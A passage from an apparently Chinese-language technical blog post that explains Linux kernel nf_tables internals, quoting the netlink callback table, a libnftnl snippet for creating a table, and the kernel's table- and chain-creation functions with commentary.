class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnl_callback</span> <span class="title">nf_tables_cb</span>[<span class="title">NFT_MSG_MAX</span>] =</span> &#123;</span><br><span class="line">[NFT_MSG_NEWTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_newtable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETTABLE] = &#123;</span><br><span class="line">.call_rcu= nf_tables_gettable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_deltable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWCHAIN] = &#123;</span><br><span class="line">.call_batch= nf_tables_newchain,</span><br><span class="line">.attr_count= NFTA_CHAIN_MAX,</span><br><span class="line">.policy= nft_chain_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETCHAIN] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getchain,</span><br><span class="line">.attr_count= NFTA_CHAIN_MAX,</span><br><span class="line">.policy= nft_chain_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELCHAIN] = &#123;</span><br><span class="line">.call_batch= nf_tables_delchain,</span><br><span class="line">.attr_count= NFTA_CHAIN_MAX,</span><br><span class="line">.policy= nft_chain_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWRULE] = &#123;</span><br><span class="line">.call_batch= nf_tables_newrule,</span><br><span class="line">.attr_count= NFTA_RULE_MAX,</span><br><span class="line">.policy= nft_rule_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETRULE] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getrule,</span><br><span class="line">.attr_count= NFTA_RULE_MAX,</span><br><span class="line">.policy= nft_rule_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELRULE] = &#123;</span><br><span class="line">.call_batch= nf_tables_delrule,</span><br><span class="line">.attr_count= NFTA_RULE_MAX,</span><br><span class="line">.policy= nft_rule_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWSET] = &#123;</span><br><span class="line">.call_batch= nf_tables_newset,</span><br><span class="line">.attr_count= NFTA_SET_MAX,</span><br><span class="line">.policy= nft_set_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETSET] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getset,</span><br><span class="line">.attr_count= NFTA_SET_MAX,</span><br><span class="line">.policy= nft_set_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELSET] = &#123;</span><br><span class="line">.call_batch= nf_tables_delset,</span><br><span class="line">.attr_count= NFTA_SET_MAX,</span><br><span class="line">.policy= nft_set_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWSETELEM] = &#123;</span><br><span class="line">.call_batch= nf_tables_newsetelem,</span><br><span class="line">.attr_count= NFTA_SET_ELEM_LIST_MAX,</span><br><span class="line">.policy= nft_set_elem_list_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETSETELEM] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getsetelem,</span><br><span class="line">.attr_count= NFTA_SET_ELEM_LIST_MAX,</span><br><span class="line">.policy= nft_set_elem_list_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELSETELEM] = &#123;</span><br><span class="line">.call_batch= nf_tables_delsetelem,</span><br><span class="line">.attr_count= NFTA_SET_ELEM_LIST_MAX,</span><br><span class="line">.policy= nft_set_elem_list_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETGEN] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getgen,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWOBJ] = &#123;</span><br><span class="line">.call_batch= nf_tables_newobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETOBJ] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELOBJ] = &#123;</span><br><span class="line">.call_batch= nf_tables_delobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETOBJ_RESET] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWFLOWTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_newflowtable,</span><br><span class="line">.attr_count= NFTA_FLOWTABLE_MAX,</span><br><span class="line">.policy= nft_flowtable_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETFLOWTABLE] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getflowtable,</span><br><span class="line">.attr_count= NFTA_FLOWTABLE_MAX,</span><br><span class="line">.policy= nft_flowtable_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELFLOWTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_delflowtable,</span><br><span class="line">.attr_count= NFTA_FLOWTABLE_MAX,</span><br><span class="line">.policy= nft_flowtable_policy,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上述<code>nfnetlink_subsystem</code>结构体中<code>cb</code>成员即客户端，再看对应的<code>nf_tables_cb</code>针对不同的操作定义了多个回调客户端，例如<code>NEWTABLE、NEW_CHAIN</code>之类的操作。</p><h3 id="创建table操作"><a href="#创建table操作" class="headerlink" title="创建table操作"></a>创建table操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftnl_table</span> *<span class="title">table</span> =</span> nftnl_table_alloc();</span><br><span class="line">nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);</span><br><span class="line">nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> *<span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line"><span class="keyword">int</span> table_seq = seq;</span><br><span class="line"></span><br><span class="line">nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);</span><br><span class="line">nftnl_table_nlmsg_build_payload(nlh, table);</span><br><span class="line">nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">mnl_nlmsg_batch_next(batch);</span><br><span class="line"><span class="keyword">if</span> (nl == <span class="literal">NULL</span>)</span><br><span class="line">  errExit(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">                          mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>)</span><br><span class="line">  err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br></pre></td></tr></table></figure><p>上面就是生成一个<code>table</code>的小🌰。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nc-&gt;call_batch) &#123;</span><br><span class="line">  err = nc-&gt;call_batch(net, net-&gt;nfnl, skb, nlh,</span><br><span class="line">                       (<span class="keyword">const</span> struct nlattr **)cda,</span><br><span class="line">                       &amp;extack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在内核中会调用客户端对应的<code>call_batch</code>成员，这里创建<code>table</code>对应的就是<code>nf_tables_newtable</code>函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newtable</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">      struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line">u32 flags = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line">attr = nla[NFTA_TABLE_NAME];</span><br><span class="line">table = nft_table_lookup(net, attr, family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(table) != -ENOENT)</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"><span class="keyword">return</span> nf_tables_updtable(&amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_TABLE_FLAGS]) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(nla[NFTA_TABLE_FLAGS]));</span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~NFT_TABLE_F_DORMANT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">table = kzalloc(<span class="keyword">sizeof</span>(*table), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (table == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_kzalloc;</span><br><span class="line"></span><br><span class="line">table-&gt;name = nla_strdup(attr, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (table-&gt;name == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_strdup;</span><br><span class="line"></span><br><span class="line">err = rhltable_init(&amp;table-&gt;chains_ht, &amp;nft_chain_ht_params);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> err_chain_ht;</span><br><span class="line"></span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;chains);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;sets);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;objects);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;flowtables);</span><br><span class="line">table-&gt;family = family;</span><br><span class="line">table-&gt;flags = flags;</span><br><span class="line">table-&gt;handle = ++table_handle;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line">err = nft_trans_table_add(&amp;ctx, NFT_MSG_NEWTABLE);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_trans;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;table-&gt;<span class="built_in">list</span>, &amp;net-&gt;nft.tables);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_trans:</span><br><span class="line">rhltable_destroy(&amp;table-&gt;chains_ht);</span><br><span class="line">err_chain_ht:</span><br><span class="line">kfree(table-&gt;name);</span><br><span class="line">err_strdup:</span><br><span class="line">kfree(table);</span><br><span class="line">err_kzalloc:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用<code>attr = nla[NFTA_TABLE_NAME];</code>查找是否存在<code>table</code>，如果存在则调用<code>nf_tables_updtable(&amp;ctx);</code>进行更新，如果不存在则使用<code>kzalloc</code>创建，然后最后将其放到上下文中，并且加入到<code>&amp;net-&gt;nft.tables</code>中。</p><h3 id="创建chain操作"><a href="#创建chain操作" class="headerlink" title="创建chain操作"></a>创建chain操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newchain</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">      struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line">u8 policy = NF_ACCEPT;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">u64 handle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_CHAIN_TABLE], family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain = <span class="literal">NULL</span>;</span><br><span class="line">attr = nla[NFTA_CHAIN_NAME];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_HANDLE]) &#123;</span><br><span class="line">handle = be64_to_cpu(nla_get_be64(nla[NFTA_CHAIN_HANDLE]));</span><br><span class="line">chain = nft_chain_lookup_byhandle(table, handle, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line">attr = nla[NFTA_CHAIN_HANDLE];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">chain = nft_chain_lookup(net, table, attr, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(chain) != -ENOENT) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line">chain = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_POLICY]) &#123;</span><br><span class="line"><span class="keyword">if</span> (chain != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">    !nft_is_base_chain(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain == <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">    nla[NFTA_CHAIN_HOOK] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">policy = ntohl(nla_get_be32(nla[NFTA_CHAIN_POLICY]));</span><br><span class="line"><span class="keyword">switch</span> (policy) &#123;</span><br><span class="line"><span class="keyword">case</span> NF_DROP:</span><br><span class="line"><span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nf_tables_updchain(&amp;ctx, genmask, policy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nf_tables_addchain(&amp;ctx, family, genmask, policy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过<code>table = nft_table_lookup(net, nla[NFTA_CHAIN_TABLE], family, genmask);</code>获取对应的<code>table</code>，如果是没有则直接退出。然后上面存在两种方式寻找<code>chain</code>，如果找到了调用<code>nf_tables_updchain(&amp;ctx, genmask, policy);</code>进行更新即可，如果没有则使用<code>nf_tables_addchain(&amp;ctx, family, genmask, policy);</code>添加。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_addchain</span><span class="params">(struct nft_ctx *ctx, u8 family, u8 genmask,</span></span></span><br><span class="line"><span class="params"><span class="function">                              u8 policy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> * <span class="title">const</span> *<span class="title">nla</span> =</span> ctx-&gt;nla;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span> =</span> ctx-&gt;table;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_base_chain</span> *<span class="title">basechain</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_stats</span> __<span class="title">percpu</span> *<span class="title">stats</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> 